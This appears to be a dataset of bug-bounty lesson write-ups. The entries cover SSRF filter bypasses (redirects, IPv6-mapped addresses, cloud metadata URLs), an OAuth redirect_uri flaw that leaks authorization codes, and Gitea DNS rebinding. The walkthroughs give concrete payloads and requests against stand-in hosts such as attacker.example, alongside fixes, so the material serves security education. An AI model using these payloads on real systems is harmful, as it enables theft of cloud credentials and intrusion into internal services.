title: How I Found SSRF in 6 Known Companies Using One Methodology in 2026
summary_en: A researcher exploited SSRF across multiple companies by bypassing application-level URL filters using HTTP redirects and IPv6-mapped address notation to access sensitive internal services.

lesson.cause: The vulnerability is caused by the application server fetching user-provided URLs without proper validation against internal network ranges. Developers relied on string-based blocklists (lists of forbidden words) and application-layer checks rather than network-level egress filtering (firewalls). This allowed attackers to use alternative representations of internal IP addresses or external redirects to trick the server into accessing private resources. The root issue is that the server trusts the destination of a URL provided by an untrusted user and fails to re-validate the destination after following an HTTP redirect.
lesson.walkthrough:
RECON
1. Identify features where the server fetches data from a URL (a web address), such as webhooks, API integrations, or 'Import from URL' tools.
2. Set up a listener like Burp Collaborator (a tool that records incoming internet traffic) to see if the server actually makes an HTTP request (a message asking for data).
3. Submit the listener URL to the application and check if the server's IP address (a unique numerical label for a device) appears in your logs.
DISCOVERY
4. Test if the application blocks internal addresses by submitting a standard local IP.
http://127.0.0.1
Why: This checks if the server has a basic filter against 'localhost' (the server's own internal address).
5. Observe the error message; a specific 'Address is blocked' error suggests the check is happening in the code (input validation), not the network.
EXPLOITATION: REDIRECT BYPASS
6. Create a script on your own server that tells any visitor to go to an internal address using a redirect (a command telling the requester to look elsewhere).
header("Location: http://127.0.0.1:15000/config_dump");
Why: This script sends a 302 Found response, which instructs the application server to fetch a new location.
7. Submit the URL of your script to the vulnerable application.
https://your-server.com/r.php
Why: The application validates your external URL as safe, but then follows the redirect to the 'unsafe' internal endpoint (a specific URL path on a server) without re-checking it.
8. Use a 307 Temporary Redirect if you need to preserve the HTTP method (like POST) when hitting internal APIs (tools for software to talk to each other).
EXPLOITATION: IPV6 BYPASS
9. Use an IPv6-mapped address (a way to write IPv4 addresses in a newer format) to represent a forbidden IPv4 address.
https://[::ffff:127.0.0.1]:15000/
Why: The blocklist (a list of forbidden items) looks for the string '127.0.0.1' but doesn't recognize the IPv6 version, which points to the same internal location.
IMPACT
10. Access internal services like the Envoy Admin interface or HashiCorp Vault (a secret management service).
https://[::ffff:10.100.133.55]:8200/v1/sys/health
Why: This reaches a private service that stores sensitive company secrets and credentials, which are normally hidden from the public internet.
lesson.example: A fictional site 'target.example' has a 'Fetch Profile Picture' feature where you provide a URL. If you provide 'http://169.254.169.254/latest/meta-data/', the server blocks it. To bypass this, you host a file at 'http://attacker.example/pic.php' containing: header('Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/'). When you submit your URL to target.example, its server fetches your script, follows the redirect, and returns the cloud provider's secret access keys in the response because it failed to validate the redirect destination.
lesson.takeaway: Always test URL inputs with a collaborator tool to confirm the server is making the request. Look for 'Address blocked' errors as a sign of bypassable application-level filters. Try alternative IP formats like decimal, hex, or IPv6-mapped addresses to evade string-based blocklists. A common mistake is stopping after a 'blocked' message; instead, use that as a signal to try different bypass techniques like redirects or DNS rebinding. Remember that 307 redirects are essential for preserving POST requests to internal APIs. Variants of this bug often appear in features like PDF generators, image processors, or webhook integrations.
lesson.fix: The most effective fix is to implement network-level egress filtering (firewalls) that prevent the application server from reaching any internal IP ranges (like 10.0.0.0/8 or 127.0.0.1). Additionally, use a strict allowlist of permitted domains rather than a blocklist of forbidden ones. In code, resolve the DNS of the user-provided URL once, verify the resulting IP is not in a private range, and then connect directly to that IP to prevent DNS rebinding attacks. Ensure that redirects are also validated before being followed by the server.

title: The Bug Hiding In A Feature Nobody Uses Anymore
summary_en: A legacy inter-site notification feature from 2005 allowed for Server-Side Request Forgery (SSRF) by forcing the server to fetch arbitrary URLs to 'verify' links.

lesson.cause: The application maintained an active but forgotten legacy interface (old software still running) from 2005. This interface included an inter-site notification feature designed to verify links between websites. The root cause was that the server would fetch (download data from) any URL provided in a notification to verify a link's existence without checking if the URL was an internal or restricted address.
lesson.walkthrough:
RECON
1. The researcher performed a security assessment on a standard business website in Europe.
2. They looked for hidden or forgotten features that might have been overlooked by other hunters.
DISCOVERY
3. The researcher discovered a legacy publishing interface (a point where a user interacts with a system) dating back to 2005.
4. The site owner was unaware this interface still existed on their server.
5. The researcher identified an 'inter-site notification' feature within this interface.
6. They analyzed the feature's logic: it was designed to allow one site to notify another when a link was created.
7. The researcher noted that the receiving site would automatically 'fetch' (request data from) the provided URL to verify the link.
EXPLOITATION
8. The researcher prepared a request (a message sent to a server) to the notification endpoint.
9. They provided a specific URL for the server to visit.
10. The researcher observed the server's behavior when processing the notification.
11. The server attempted to connect to the provided URL to verify the link genuinely existed.
(b) "their site would then fetch your page to verify that the link genuinely existed"
(c) Why: The server blindly follows the instruction to visit a URL, which is the core mechanism of SSRF (Server-Side Request Forgery, where a server is tricked into making unintended requests).
IMPACT
12. The researcher confirmed that they could force the server to make requests to arbitrary locations.
13. This vulnerability allows an attacker to use the server as a proxy to scan internal networks or access restricted metadata.
14. The finding was reported to the company as a valid security vulnerability.
lesson.example:
Imagine a website target.example that has an old 'pingback' feature at target.example/legacy/ping. This feature accepts a 'source' parameter. 

Request:
POST /legacy/ping
Host: target.example
Content-Type: application/x-www-form-urlencoded

source=http://169.254.169.254/latest/meta-data/

In this example, the server sees the 'source' URL and uses its own internal permissions to fetch it. Because 169.254.169.254 is a special internal address for cloud metadata, the server might return sensitive information like API keys or internal configuration to the attacker, thinking it is just 'verifying a link.'
lesson.takeaway: Always hunt for legacy endpoints and forgotten features like XML-RPC, Pingbacks, or old API versions (e.g., /v1/ instead of /v3/). These features often lack modern security filters. Use tools like 'waybackurls' or 'gau' to find paths that existed years ago but are still active on the server. A common beginner mistake is assuming that if a feature isn't linked on the main page, it is safe or disabled.
lesson.fix: The most effective fix is to completely disable and remove legacy interfaces that are no longer required for business operations. If the feature must remain, implement a strict whitelist (a list of allowed safe addresses) and ensure the server cannot make requests to internal IP ranges (such as 127.0.0.1, 10.0.0.0/8, or 169.254.169.254). Use a dedicated, isolated network service for outgoing requests to prevent them from accessing the internal environment.

title: Exposed MCP Server: From Recon to OAuth Security Flaws
summary_en: The MCP service allowed anyone to register an OAuth client without authentication and without validating the redirect_uri, resulting in an open‑redirect and SSRF that can be used to steal authorization codes.

lesson.cause: The root cause is a missing authentication check on the dynamic client registration endpoint (POST /mcp/register), allowing unauthenticated users to create clients. The server also fails to validate the "redirect_uris" parameter, so any attacker‑controlled URL is accepted. Because the redirect_uri is later used by the authorization endpoint without verification, the service performs an open redirect. Additionally, the backend fetches the supplied URL during registration, causing a server‑side request forgery (SSRF). These flaws stem from trusting user‑provided data without proper sanitisation or access control.
lesson.walkthrough:
RECON
Step 1: Open the base MCP URL in a browser.
GET https://REDACTED/mcp
Why: An HTTP request (a message sent to a server) returns a simple JSON response showing the service is alive.
Step 2: Run dirsearch (a directory‑brute‑forcing tool) against the host.
GET https://REDACTED/dirsearch_output.txt
Why: The tool enumerates hidden paths; it discovered an "/examples/" directory.
Step 3: Browse the discovered sitemap file.
GET https://REDACTED/examples/sitemap.xml
Why: A sitemap (XML file) often lists internal URLs; it revealed "/examples/api-reference.html".
Step 4: Open the API reference page.
GET https://REDACTED/examples/api-reference.html
Why: The page documents all HTTP endpoints, including the OAuth flow.

DISCOVERY
Step 5: Locate the client‑registration endpoint in the docs.
POST /mcp/register
Why: The documentation shows the HTTP method (POST) and path; this endpoint creates OAuth clients.
Step 6: Note the "redirect_uris" parameter definition (an array of URLs).
Why: A parameter is a piece of data sent to the server; here it tells the auth server where to send users after login.

EXPLOITATION
Step 7: Craft a registration request with a domain you control (Burp Collaborator).
POST /mcp/register HTTP/2
Host: REDACTED
Content-Type: application/json

{"client_name":"My AI App","redirect_uris":["https://COLLABORATOR.example/"]}
Why: This payload (the body of the request) registers a new client; no authentication is required, so anyone can send it.
Step 8: Send the request and receive a 201 Created response.
HTTP/2 201 Created
{"client_id":"REDACTED","client_secret":"REDACTED","redirect_uris":["https://COLLABORATOR.example/"]}
Why: The server accepted the unvalidated redirect_uri and returned credentials.
Step 9: Observe DNS and HTTP interactions on the Collaborator domain.
GET / HTTP/1.1\nHost: COLLABORATOR.example
Why: The server fetched the supplied URL, proving an SSRF (server‑side request forgery) where the backend makes outbound requests to attacker‑controlled hosts.
Step 10: Build an authorization request using the new client_id and redirect_uri.
GET /mcp/authorize?response_type=code&client_id=REDACTED&redirect_uri=https://COLLABORATOR.example/&scope=openid&state=TEST&code_challenge=REDACTED&code_challenge_method=S256
Why: This HTTP GET (request) starts the OAuth flow; the redirect_uri is again unchecked, so the user is sent to the attacker domain.
Step 11: Open the URL in a browser and watch the redirect.
Browser navigates to https://COLLABORATOR.example/?code=...&state=TEST
Why: The open redirect leaks the authorization code to the attacker, enabling token exchange.

IMPACT
Step 12: Use the captured code to request an access token (not shown in article but implied).
POST /mcp/token with code=...&client_id=REDACTED&client_secret=REDACTED
Why: With the code, an attacker can obtain a JWT (JSON Web Token) and act as the victim user.
lesson.example:
Assume a fictional service at https://target.example that offers OAuth client registration at POST /oauth/register. The server code (vulnerable) simply stores the supplied "redirect_uris" array without checks:

```python
# vulnerable snippet
data = json.loads(request.body)
client_id = generate_id()
store[client_id] = {
    "redirect_uris": data.get("redirect_uris", []),
    "secret": generate_secret()
}
return json.dumps({"client_id": client_id, "client_secret": store[client_id]["secret"]})
```
An attacker sends:

POST /oauth/register HTTP/1.1
Host: target.example
Content-Type: application/json

{"client_name":"evil","redirect_uris":["https://attacker.example/cb"]}

The server replies with a new client_id and secret. Later, the attacker initiates:

GET /oauth/authorize?response_type=code&client_id=123&redirect_uri=https://attacker.example/cb&state=xyz

The service redirects the user to https://attacker.example/cb?code=...&state=xyz, leaking the code. Because the redirect_uri was never validated, the attack works. The same flaw also causes the server to request https://attacker.example during registration, demonstrating SSRF.
lesson.takeaway: When you see an unauthenticated client‑registration endpoint, assume the redirect_uri may be unchecked. Look for "redirect_uris" or similar parameters in OAuth docs and test with a domain you control. Tools like Burp Collaborator or dnslog can confirm out‑bound requests (SSRF) and redirects. Variants include open‑redirects in SAML ACS URLs or OpenID Connect "post_logout_redirect_uri". Beginners often forget to check whether the server validates the URL scheme or domain, leading to false‑negative results.

title: Gitea Guarded Three Doors and Forgot the Fourth
summary_en: Gitea's push mirror feature only validated destination addresses during initial setup, allowing attackers to bypass security filters by later changing the destination's DNS record to point to internal network services.

lesson.cause: The vulnerability is a Time-of-Check to Time-of-Use (TOCTOU) flaw within the push mirror logic. Gitea validates the 'remote_address' parameter against a blocklist only when the mirror is first created via the '/api/v1/repos/{owner}/{repo}/push_mirrors' endpoint. However, the background process that performs the actual 'git push' later does not re-verify the address. This allows a hostname that initially pointed to a safe public IP to be redirected to a restricted internal IP after the check has already passed.
lesson.walkthrough:
RECON
1. Identify that Gitea allows users to create 'Push Mirrors,' which are automated tasks that copy code to another server.
2. Note that Gitea uses a blocklist (a list of forbidden addresses) to prevent mirrors from connecting to internal company servers.
DISCOVERY
3. Observe the API endpoint used to create a mirror:
POST /api/v1/repos/{owner}/{repo}/push_mirrors
4. Send a test request with a public hostname to see if it is accepted:
{"remote_address": "http://attacker.example/repo.git", "sync_on_commit": true}
Why: The server checks 'attacker.example' against the blocklist. Since it points to a public IP, the server saves it (A 'hostname' is a human-readable name for a computer, like 'google.com').
EXPLOITATION
5. Set up a domain name ('attacker.example') that you control to point to a safe, public IP address.
6. Create the mirror in Gitea using this domain name.
7. Change the DNS record for 'attacker.example' so it now points to an internal IP address, such as '192.168.1.50' (DNS is the system that translates hostnames into numerical IP addresses).
8. Push a new commit to your Gitea repository to trigger an automatic sync.
9. Gitea executes the 'git push' command using the saved hostname:
git push --mirror --force http://attacker.example/repo.git
Why: Gitea's background worker performs a new DNS lookup. Because you changed the record, Gitea now connects to the internal server at '192.168.1.50', bypassing the initial blocklist check.
IMPACT
10. The 'git push' command uses the '--force' flag, which overwrites data on the target.
11. If the internal server accepts pushes without a password, the attacker can delete or replace any code on that internal machine.
lesson.example:
Imagine a website 'target.example' that lets you 'Import Profile Picture from URL.' 
1. The server checks if the URL is '127.0.0.1' (itself) and blocks it if so.
2. You provide 'http://my-cool-dog.com/pic.jpg'. The server checks the IP of 'my-cool-dog.com', sees it is a public IP, and saves the URL to a database.
3. Five minutes later, a background 'Worker' process reads the URL from the database to download the image.
4. You have changed 'my-cool-dog.com' to point to '127.0.0.1'.
5. The Worker process downloads from 'my-cool-dog.com', which now resolves to '127.0.0.1', allowing you to access the server's internal files.
This works because the 'Check' happened at 12:00, but the 'Use' happened at 12:05 after the destination changed.
lesson.takeaway: When hunting for SSRF, look for 'delayed' actions where a URL is saved now but used later in a background task. If the application only validates the URL at the moment of entry, it is likely vulnerable to DNS rebinding or simple record updates. Always check if 'Pull' and 'Push' features use the same validation logic, as developers often secure one but forget the other. A common mistake is assuming that because a hostname was safe once, it will stay safe forever.

title: Security Context Dies at Boundaries
summary_en: After spending enough time reviewing security-sensitive systems, individual vulnerabilities start looking less individual. The technologies change. One bug is in a browser-facing development server. Another is in a WebSocket stream.
excerpt: After spending enough time reviewing security-sensitive systems, individual vulnerabilities start looking less individual. The technologies change. One bug is in a browser-facing development server. Another is in a WebSocket stream. Another appears in an identity platform. Another lives inside SSRF protection. Another is buried in a DeFi oracle calculation. Yet the same structural failure keeps appearing: > **_A security property exists on one side of a boundary, but does not survive the transition to the other side._** Identity disappears.
